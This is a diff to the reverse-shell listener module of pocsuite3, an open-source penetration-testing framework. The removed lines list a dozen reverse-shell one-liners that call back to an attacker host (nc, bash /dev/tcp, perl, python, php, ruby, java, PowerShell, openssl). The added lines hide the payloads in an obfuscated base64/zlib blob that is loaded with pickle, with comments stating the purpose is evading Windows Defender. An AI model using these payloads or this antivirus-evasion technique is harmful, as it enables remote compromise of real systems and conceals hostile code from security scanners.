@@ -1,10 +1,13 @@
+import base64
+import pickle
+import zlib
 import select
 import socket
 import threading
 import time
 import os
 from pocsuite3.lib.utils import gen_cert
-from pocsuite3.lib.core.common import data_to_stdout, has_poll, get_unicode, desensitization
+from pocsuite3.lib.core.common import data_to_stdout, has_poll, get_unicode, mosaic
 from pocsuite3.lib.core.data import conf, kb, logger, paths
 from pocsuite3.lib.core.datatype import AttribDict
 from pocsuite3.lib.core.enums import AUTOCOMPLETE_TYPE, OS, CUSTOM_LOGGING
@@ -76,8 +79,7 @@ def listener_worker():
             client.conn = conn
             client.address = address
             kb.data.clients.append(client)
-            info_msg = "new connection established from {0}".format(
-                desensitization(address[0]) if conf.ppt else address[0])
+            info_msg = "new connection established from {0}".format(mosaic(address[0]))
             logger.log(CUSTOM_LOGGING.SUCCESS, info_msg)
         except Exception:
             pass
@@ -111,8 +113,7 @@ def list_clients():
             del kb.data.clients[i]
             continue
 
-        results += (f'{i}   ' + (desensitization(client.address[0]) if conf.ppt else str(client.address[0])) +
-                    f'     ({system})\n')
+        results += (f'{i}   ' + mosaic(client.address[0]) + f'     ({system})\n')
     data_to_stdout("----- Remote Clients -----" + "\n" + results)
 
 
@@ -121,8 +122,7 @@ def get_client(cmd):
         target = cmd.split(" ")[1]
         target = int(target)
         client = kb.data.clients[target]  # Connect to the selected clients
-        data_to_stdout("Now Connected: {0}\n".format(
-            desensitization(client.address[0]) if conf.ppt else client.address[0]))
+        data_to_stdout("Now Connected: {0}\n".format(mosaic(client.address[0])))
         return client
     except Exception:
         data_to_stdout("Invalid Client\n")
@@ -130,9 +130,7 @@ def get_client(cmd):
 
 
 def send_shell_commands_for_console(client):
-    module_prompt_default_template = (
-        "\001\033[4m\002SHELL\001\033[0m\002 (\001\033[91m\002{hostname}\001\033[0m\002) > "
-    )
+    module_prompt_default_template = "\033[4mSHELL\033[0m (\033[91m{hostname}\033[0m) > "
     while True:
         cmd = None
         try:
@@ -171,7 +169,7 @@ def send_shell_commands(client):
         cmd = None
         try:
             address = client.address[0]
-            cmd = input("{0}>: ".format(desensitization(address) if conf.ppt else address))
+            cmd = input("{0}>: ".format(mosaic(address)))
             if not cmd:
                 continue
 
@@ -220,7 +218,7 @@ def poll_cmd_execute(client, timeout=3):
 
                 ready = event & select.POLLPRI or event & select.POLLIN
                 if not ready:
-                    ret = "execute command timeout\n"
+                    ret = "Command has no result or filtered by firewall\n"
                     break
                 else:
                     time.sleep(0.05)
@@ -232,7 +230,7 @@ def poll_cmd_execute(client, timeout=3):
                         continue
                     break
                 elif count > timeout:
-                    ret = "execute command timeout\n"
+                    ret = "Command has no result or filtered by firewall\n"
                     break
                 else:
                     data_to_stdout(".")
@@ -257,7 +255,7 @@ def poll_cmd_execute(client, timeout=3):
                         continue
                     break
                 elif count > timeout:
-                    ret = "execute command timeout\n"
+                    ret = "Command has no result or filtered by firewall\n"
                 else:
                     data_to_stdout('.')
                     read_again = False
@@ -331,42 +329,47 @@ def handle_listener_connection():
 
 
 class REVERSE_PAYLOAD:
-    NC = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f"""
-    NC2 = """nc -e /bin/sh {0} {1}"""
-    NC3 = """rm -f /tmp/p;mknod /tmp/p p && nc {0} {1} 0/tmp/p"""
-    BASH = """bash -c 'sh -i >& /dev/tcp/{0}/{1} 0>&1'"""
-    BASH2 = """bash -c 'sh -i &gt;&amp; /dev/tcp/{0}/{1} 0&gt;&amp;1'"""
-    TELNET = """rm -f /tmp/p; mknod /tmp/p p && telnet {0} {1} 0/tmp/p"""
-    PERL = (
-        """perl -e 'use Socket;$i="{0}";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));"""
-        """if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");"""
-        """open(STDERR,">&S");exec("/bin/sh -i");}};'"""
+    # Evading Windows Defender
+    # Pocsuite3 is an open source security tool, not virus.
+    # I believe that this is a false positive of your antivirus tool :)
+    payload = (
+        b'eJyVV19z20QQLzTQTqevPMLcaFRLAll2HFzAijwkrksCxvbYLm0n43Fl+ZSI2JLQ'
+        b'nZuY2DPwrkfxyAsfgC/D8MKX4Cuwe5Icx6R0cGak097e7m/39l9+2vnl4uEd8Vsl'
+        b'avxuu5HEzWhGSnwWllxzdu56bpB/OTbPlsvS2PNL7IwUPVKpF3aXvkOuyitytbsi'
+        b'9ZQlie+2G5Uk/gC2ipTkBzIusbuXxLugq+imUkNQ5weT7IOEpFAgG3LLKT2J3zs8'
+        b'6B+Vk/ijVH+9QEoT+rrEnbAEvCXBC5iSeAcZk1gd28jpEOW/DyiZaAD9eOtI4ZSb'
+        b'BXsWmrecXO+hgPcHzVa7OUjiARoWbVh27chwubxpqMnp1Kf82tL9jC932m49t32n'
+        b'2+y1kvjPkEZTdKsyZ5T0A+ecclP2LAlESKYcWiDGZIKs9vXu09ExgNL7ncY3o/6g'
+        b'1zz4Vj+lPIwCHowXvj2jqgQmSZpmeq7qBL5PHTyHAuzJJBp5viqHugcYRzYP4MPT'
+        b'4Hd1FYTUV/uDJ8dtXaoX+pJm5pTOs8E2qdnr5SR6SR1Vuo4hIK1WJrqv+3Jw1Gkn'
+        b'8V/hgp8FvrgCbxYGESepOTqbjwG4QxnTA2YyKyUbmbHZ10Fmcfa5YbhmMiO3UBXu'
+        b'0sFXYHnAjMk8rKjMcL0p9QNV08uaSW4h795OrmhmaF2jMxx7OlVPcislXQI7hxpa'
+        b'ebd71E3iJ+FZCCFCFBlRWi4+ha+uUf3LUWS/sAfxu4dJtycJYTu9Z4cvk/jHaD5e'
+        b'gLjUYhEa9NLjxHOJG0TnpmMNGt00UAyfXmRKJNACYi7OwAjVmU0sx4DAYJp53DFC'
+        b'AQaIuhRJcNlLL1g6Rhh5PkgNjIjak9WK+hPE8PXBdwdJ/GtELNKb+9ybUZSTLVXt'
+        b'QQgbkSGsyTyCCYY+ceCBdFLdr2/nlig4+4UqWRKBkKBOMoU4NMkkIDKu0BNVcEkV'
+        b'ST6VhsRmpM8B5enJEBQbF7bHnwaRqiXxg27nebPXP2q2WsmLv9+5c0d2ph4FcyzS'
+        b'phfFzvh7iArSXzBOZ0Yb40b4ixnguobgVBWApqR3IzMOeGZwOBNjfEV5X9BUzTwZ'
+        b'Lzg9GQ5lfDNgKhvG42p1r7p8dAUyVpnPIZVQQCrK6IF9anpCJ2WdpEujRf1TfqZp'
+        b'pAj2luEqTHlicxsOqhu4i4NFSNuQzLkFA3oJmdBvHB83fSeYgEe0DCIsczWoxUNj'
+        b'4CbHtnOOQj16SVINWNvB+505L6bHyAZrRSDPz31ClG6fKPBWw4uJZnRtfobEOlGy'
+        b'I6APpZ9wxEUzSMNaTUAU0A4RknqtYO1k43nkcaqu5QDs9Tp3z5r36XTOzlQNfJxf'
+        b'TGMaMIoRcK/Tbbb7faigP2/WZ3ajPrMb9ZlBfd5MwIwouh5mCGNTwkZZIBV/mHuY'
+        b'fVmFwYpeg2CpZ1pu6AQ0UAdGiObFQwjGdTlw+CW3UltGIAjdNXLgCxxwIoE6yaqf'
+        b'SK9p5LmLUUhpBN+uPWVU3ySOsKznO8NhnuMys77MRKeVIkOuouBaqZQBlnSZRn6A'
+        b'T+DW98p6Wj1HjdZxsz0YNTrtdrMx0AVW7ASZ9KnlYv0ANUgU+S5PdTmAywksqOPT'
+        b'YAK95oGUkQwL1qYbzsURQVzBTymI8eDTdHjIu+L1EJH1aRgfDtd9urxf2P1srygq'
+        b'JoHVLdUEOAUTVAt8VsQLqte9tGdj278xjZB/jyPbjTpvy4C2msTd/9PzNyebN/f7'
+        b'u61nUFj/mM5ttF+aBtBVCLMiCoEWUVVJL1HRzHSHWzZjNII+aIDlKrQ1Xsu73Ubp'
+        b'Sqspj+YU62h6NNIvLV6LqEO915ArmUA3FwgVP20Ika5Eipbvj/N9t4bFWVU+thWh'
+        b'FbNTHUMH8yemW3PSBEQ02UpK4vs4y4j4j3+7Mc8cd2q1tPTCu9/CeUb0MGxoOkwo'
+        b'cgjB41hbbMU69rUuxP4BzCxWXVrHMmyOstSYQQBa9XKeDmzBBGzZ0WVP/3z3iwrG'
+        b'LVAv0nrj6K9k7xVGJQ6H2GkhSpztVqu4G811q4UbPBh5aVQy0TvdrX7+aALxCI8K'
+        b'PiXdxT8NtN1Hbal3ft9SGOV155Yu34EtOCQ8Ih4bPf/NE4CWz0RvGQXQGvb2eeB+'
+        b'u3EwSLF/6GMT3/gHoFhE5Pm/AXPjH5hWGLM='
     )
-    PYTHON = (
-        """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"""
-        """s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"""
-        """p=subprocess.call(["/bin/sh","-i"]);'"""
-    )
-    PHP = """php -r '$sock=fsockopen("{0}",{1});exec("/bin/sh -i <&3 >&3 2>&3");'"""
-    RUBY = """ruby -rsocket -e'f=TCPSocket.open("{0}",{1}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""
-    JAVA = (
-        'r = Runtime.getRuntime()\n'
-        'p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{0}/{1};cat <&5 | '
-        'while read line; do $line 2>&5 >&5; done"] as String[])\n'
-        'p.waitFor()'
-    )
-    POWERSHELL = (
-        '''$client = New-Object System.Net.Sockets.TCPClient('{0}',{1});$stream = $client.GetStream();'''
-        '''[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)'''
-        '''{{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);'''
-        '''$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';'''
-        '''$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);'''
-        '''$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'''
-    )
-    OPENSSL = (
-        'rm -rf /tmp/s;mkfifo /tmp/s;/bin/sh -i </tmp/s 2>&1|openssl s_client -quiet -connect {0}:{1}>/tmp/s;'
-        'rm -rf /tmp/s'
-    )
+    vars().update(pickle.loads(zlib.decompress(base64.b64decode(payload))))
+    del payload
 
 
 if __name__ == "__main__":
